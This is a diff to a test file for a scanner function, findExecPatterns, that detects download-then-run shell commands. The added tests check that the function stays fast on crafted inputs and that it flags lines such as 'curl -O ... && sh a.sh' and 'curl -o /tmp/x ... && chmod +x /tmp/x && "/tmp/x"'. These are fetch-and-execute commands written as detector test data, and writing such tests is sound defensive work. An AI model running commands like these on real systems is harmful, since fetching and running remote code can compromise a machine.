@@ -117,6 +117,23 @@ describe("crafted pipelines after a download stay fast", () => {
   });
 });
 
+describe("Vercel review of PR 335 (rows 34 to 36 of VERCEL-FINDINGS)", () => {
+  it("01M81D6Z4V59Z3DF08YXDVACMP: many lines with 70 non-shell pipes after a download, no sink", () => {
+    const text = ("curl https://e/i" + " | cat".repeat(70) + "\n").repeat(1600);
+    expect(ms(() => findExecPatterns(text))).toBeLessThan(1500);
+    expect(findExecPatterns(text)).toEqual([]);
+  });
+  it("01M81D7JAEHCS2BK2ZJDNKM0QJ: malformed URL prefixes stay linear", () => {
+    expect(ms(() => findExecPatterns("curl -o x " + "http://?".repeat(64000) + "\n"))).toBeLessThan(1500);
+    expect(findExecPatterns("curl -O https://x.invalid/a.sh?v=1 && sh a.sh").map((h) => h.rule)).toContain("download-then-run");
+  });
+  it("01M81D87JJVN1S12PFW96K6RQN: an unclosed quote after a save stays linear, with and without chmod", () => {
+    expect(ms(() => findExecPatterns('curl -o /tmp/x https://example.com/x\n; "' + "/a".repeat(64000) + "\n"))).toBeLessThan(1500);
+    expect(ms(() => findExecPatterns('curl -o /tmp/x https://example.com/x && chmod +x /tmp/x\n; "' + "/a".repeat(64000) + "\n"))).toBeLessThan(1500);
+    expect(findExecPatterns('curl -o /tmp/x https://e/x && chmod +x /tmp/x && "/tmp/x"').map((h) => h.rule)).toContain("download-then-run");
+  });
+});
+
 describe("D: the webhook write chain stays linear", () => {
   it("640 KB of `db. ` takes well under a second", () => {
     const body = "db. ".repeat(640 * 256);
